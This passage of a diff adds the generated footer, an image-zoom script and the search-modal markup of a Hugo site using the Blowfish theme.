+          href="https://gohugo.io/" target="_blank" rel="noopener noreferrer">Hugo</a> &amp; <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
+          href="https://blowfish.page/" target="_blank" rel="noopener noreferrer">Blowfish</a>
+      </p>
+    
+  </div>
+  
+    <script>
+      mediumZoom(document.querySelectorAll("img:not(.nozoom)"), {
+        margin: 24,
+        background: "rgba(0,0,0,0.5)",
+        scrollOffset: 0,
+      });
+    </script>
+  
+  
+  
+</footer>
+<div
+  id="search-wrapper"
+  class="invisible fixed inset-0 flex h-screen w-screen cursor-default flex-col bg-neutral-500/50 p-4 backdrop-blur-sm dark:bg-neutral-900/50 sm:p-6 md:p-[10vh] lg:p-[12vh] z-500"
+  data-url="http://localhost:1313/">
+  <div
+    id="search-modal"
+    class="flex flex-col w-full max-w-3xl min-h-0 mx-auto border rounded-md shadow-lg top-20 border-neutral-200 bg-neutral dark:border-neutral-700 dark:bg-neutral-800">
+    <header class="relative z-10 flex items-center justify-between flex-none px-2">
+      <form class="flex items-center flex-auto min-w-0">
+        <div class="flex items-center justify-center w-8 h-8 text-neutral-400">
+          <span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+</span>
+        </div>
+        <input
+          type="search"
+          id="search-query"
+          class="flex flex-auto h-12 mx-1 bg-transparent appearance-none focus:outline-dotted focus:outline-2 focus:outline-transparent"
+          placeholder="Search"
+          tabindex="0">
+      </form>
+      <button
+        id="close-search-button"
+        class="flex items-center justify-center w-8 h-8 text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400"
+        title="Close (Esc)">
+        <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
+</span>
+      </button>
+    </header>
+    <section class="flex-auto px-2 overflow-auto">
+      <ul id="search-results">
+        
+      </ul>
+    </section>
+  </div>
+</div>
+
+    </div>
+  </body>
+  
+</html>
